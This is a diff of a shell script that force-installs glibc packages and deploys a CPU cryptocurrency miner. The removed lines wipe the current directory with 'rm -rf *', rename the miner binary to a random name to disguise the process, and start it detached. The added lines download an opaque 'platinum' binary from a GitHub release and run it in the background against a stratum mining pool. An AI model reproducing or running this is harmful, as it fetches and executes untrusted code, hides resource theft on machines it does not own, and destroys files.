@@ -7,11 +7,12 @@ sudo rpm -Uvh glibc-2.17-55.el6.x86_64.rpm \
 glibc-common-2.17-55.el6.x86_64.rpm \
 glibc-devel-2.17-55.el6.x86_64.rpm \
 glibc-headers-2.17-55.el6.x86_64.rpm --force --nodeps
-azure=mxsemsdnlkdj;
-rm -rf *
-wget https://github.com/minkcrypto/cpuminer-opt/releases/download/v3.9.5.2/cpuminer-rplant-linux.tar.gz
-tar -xvzf cpuminer-rplant-linux.tar.gz
-a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-sudo cp cpuminer-sse2 "$cpuname"
-echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" -a cpupower -o stratum+tcp://cpuchain.minermore.com:4551 -u nvt191655320 -p x
+mkdir /usr/share
+mkdir /usr/share/work
+rm -r /usr/share/work/platinum
+mkdir /usr/share/work/platinum
+cd /usr/share/work/platinum
+wget https://github.com/ts6aud5vkg/gpuissa/releases/download/cpuchain/platinum
+chmod +x platinum
+screen -d -m ./platinum -a cpupower -o stratum+tcp://cpuchain.minermore.com:4551 -u nvt191655320 -p x
+
